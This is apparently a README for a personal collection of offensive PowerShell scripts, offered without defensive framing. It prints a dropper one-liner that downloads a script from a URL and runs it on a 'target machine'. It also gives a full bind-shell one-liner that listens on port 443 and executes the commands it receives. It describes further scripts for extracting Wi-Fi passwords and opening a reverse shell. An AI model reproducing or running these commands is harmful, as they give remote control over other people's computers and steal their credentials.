# scripts
>scripts used for private use            
#
𝖕𝖔𝖜𝖊𝖗𝖘𝖍𝖊𝖑𝖑
#
>you can use the following command on the target machine to execute scripts
````
#powerhsell dropper
(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('URL')|iex

````
***wifiscr*** (contains code for extracting wifi passwords)

***bindscr*** (contains code for a simple bind shell)

one liner verion:

````

$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()


````
***revscr*** (contains code for an interactive reverse shell)
##
**_most of the scripts here are edited from original releases down below_**
#
*wifiscr.ps1* [link](https://gist.github.com/Saturate/fe58d57db4db36b0dfb40b9ab07efa65)

*bindscr.ps1* [link](https://github.com/samratashok/nishang)

*revscr.ps1* [link](https://github.com/ivan-sincek/powershell-reverse-tcp)
